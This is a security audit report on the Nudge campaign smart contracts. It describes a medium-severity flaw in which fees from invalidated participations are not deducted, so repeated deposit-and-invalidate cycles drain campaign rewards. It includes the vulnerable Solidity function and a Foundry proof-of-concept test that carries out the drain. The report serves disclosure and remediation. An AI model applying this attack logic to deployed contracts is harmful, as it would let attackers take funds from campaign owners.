---
title: Security Review Report
author: 4th05
date: March 24, 2025
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries 4th05\par}
    \vspace{3cm}
    {\Huge Nudge\par} 
    \vspace{0.5cm}
    {\Huge\itshape Security Review Report\par}
    \vfill
    {\Large \ 24 March 2025\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

<!-- Prepared by: [4th05](https://x.com/0x4th05)
Lead Auditors:  
- xxxxxxx
\begin{flushright}...\end{flushright}
-->

&nbsp;

&nbsp;

&nbsp;

&nbsp;


# Table of Contents

- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Overview](#overview)
- [Scope](#scope)
- [Issues found](#issues-found)
- [Findings](#findings)
  - [\[M1\] Rewards can be drained by fees of invalidated attackers' participation](#m1-rewards-can-be-drained-by-fees-of-invalidated-attackers-participation)

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Protocol Summary

Nudge is a Reallocation Marketplace that helps protocols incentivize asset movement across blockchains and ecosystems.
Nudge empowers protocols and ecosystems to grow assets, boost token demand, and motivate users to reallocate assets within their wallets—driving sustainable, KPI-driven growth.

With Nudge, protocols can create and fund campaigns that reward users for acquiring and holding a specific token for at least a week. Nudge smart contracts acts as an escrow for rewards, while its backend system monitors participants' addresses to ensure they maintain their holdings of said token for the required period. Nudge provides an all-in-one solution, eliminating the need for any technical implementation by protocols looking to run such incentivisation campaigns.

# Disclaimer

A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource and expertise bound effort where I try to find as many vulnerabilities as possible. I can not guarantee 100% security after the review or even if the review will find any problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.


&nbsp;

&nbsp;


# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

&nbsp;

&nbsp;

# Overview 
|                  |                                          |
| ---------------- | :--------------------------------------: |
| Contest platform |                Code4rena                 |
| LOC              |                   641                    |
| Language         |                 Solidity                 |
| Commit           | fbda3958dbd813e6bfa8b5a866828f7d6c59008f |
| Previous audits  |  Oak Security audit, 4naly3er, Slither  |


# Scope

 - /src/campaign/NudgeCampaign.sol
 - /src/campaign/NudgeCampaignFactory.sol
 - /src/campaign/NudgePointsCampaigns.sol
 - /src/campaign/interfaces/IBaseNudgeCampaign.sol
 - /src/campaign/interfaces/INudgeCampaign.sol
 - /src/campaign/interfaces/INudgeCampaignFactory.sol
 - /src/campaign/interfaces/INudgePointsCampaign.sol



# Issues found

| Severity | Number of issues found |
| :------- | :--------------------: |
| High     |           0            |
| Medium   |           1            |
| Low      |           0            |
| Info     |           0            |

&nbsp;

&nbsp;

# Findings

## [M1] Rewards can be drained by fees of invalidated attackers' participation

**Finding description and impact**

For all the `Participations` that become `INVALIDATED` fees are not subtracted from the `accumulatedFees`.   

```solidity
function invalidateParticipations(uint256[] calldata pIDs) external onlyNudgeOperator {
        for (uint256 i = 0; i < pIDs.length; i++) {
            Participation storage participation = participations[pIDs[i]];
            if (participation.status != ParticipationStatus.PARTICIPATING) {
                continue;
            }
            participation.status = ParticipationStatus.INVALIDATED;
            pendingRewards -= participation.rewardAmount;
        }
        emit ParticipationInvalidated(pIDs);
    }
```

This design choice opens a door to malicious behaviours that could harm the rewards of the `campaignAdmin`. 
An attacker could allocate big amounts of money acting intentionally so that to be `invalidated` reducing this way the rewards amount of a campaign. This could also be done by reiterating the allocation of a small amount of money without running any risk. 

Because of this attack, the `campaignAdmin` may face a shortage in rewards preventing this way any further allocation of funds in the campaign. 

&nbsp;

&nbsp;

**Proof of Concept**

```solidity
contract NudgeCampaignTest is Test {
    NudgeCampaign private campaign;
    address ZERO_ADDRESS = address(0);
    address NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    address owner;
    uint256 constant REWARD_PPQ = 2e13;
    uint256 constant INITIAL_FUNDING = 100_000e18;
    uint256 constant BPS_DENOMINATOR = 1e4;
    uint256 constant PPQ_DENOMINATOR = 1e15;
    address alice = address(11);
    address bob = address(12);
    address swapCaller = address(13);
    address campaignAdmin = address(14);
    address nudgeAdmin = address(15);
    address treasury = address(16);
    address operator = address(18);
    address alternativeWithdrawalAddress = address(16);
    address campaignAddress;
    uint32 holdingPeriodInSeconds = 60 * 60 * 24 * 7; // 7 days
    uint256 initialFundingAmount = 100_000e18;
    uint256 rewardPPQ = 5e14;
    uint256 RANDOM_UUID = 111_222_333_444_555_666_777;
    uint256[] pIDsWithOne = [1];
    uint16 DEFAULT_FEE_BPS = 1000;
    TestERC20 toToken;
    TestERC20 rewardToken;
    NudgeCampaignFactory factory;

    function setUp() public {
        owner = msg.sender;
        toToken = new TestERC20("Incentivized Token", "IT");
        rewardToken = new TestERC20("Reward Token", "RT");
        factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, swapCaller);

        campaignAddress = factory.deployCampaign(
            holdingPeriodInSeconds,
            address(toToken),
            address(rewardToken),
            REWARD_PPQ,
            campaignAdmin,
            0,
            alternativeWithdrawalAddress,
            RANDOM_UUID
        );
        campaign = NudgeCampaign(payable(campaignAddress));

        vm.deal(campaignAdmin, 10 ether);

        vm.prank(campaignAdmin);
        rewardToken.faucet(10_000_000e18);
        // Fund the campaign with reward tokens
        vm.prank(campaignAdmin);
        rewardToken.transfer(campaignAddress, INITIAL_FUNDING);
    }

function test_campaignAdminFeesAttack() public {
         
        uint256 start = block.timestamp;
        uint256 lastparticipationID;
        address attacker = makeAddr("attacker");
        uint256[] memory participationstoinvalidate = new uint256[](1); 
        uint256 idparticipationstoinvalidate;

        vm.prank(swapCaller);
        toToken.approve(address(campaign), type(uint256).max);
        uint256 availablerewards = campaign.claimableRewardAmount();
        
        while (availablerewards >= 50_000e18){
        // Simulate getting toTokens from end user
        vm.startPrank(swapCaller);
        toToken.faucet(50_000e18);
        campaign.handleReallocation(RANDOM_UUID, attacker, address(toToken), 50_000e18, "");
        
        lastparticipationID = campaign.pID();
        // pass time for holdings check
        start += 5 minutes;
        vm.warp(start);
        vm.stopPrank();

        vm.startPrank(operator);
        idparticipationstoinvalidate++;
        participationstoinvalidate[0] = lastparticipationID;
        campaign.invalidateParticipations(participationstoinvalidate);
        vm.stopPrank();

        availablerewards = campaign.claimableRewardAmount();
        }

        assertLe(campaign.claimableRewardAmount(), 50_000e18);
    }
}
```
&nbsp;

&nbsp;

**Recommended mitigation steps**

Possible solutions 
- Subtract the fees from the `accumulatedFees` variable, in case of `ParticipationStatus.INVALIDATED`
- Keep a small percentage from reallocated amounts of money and give them back to the user when claiming the rewards
- Add the fees to `accumulatedFees` when users claim rewards
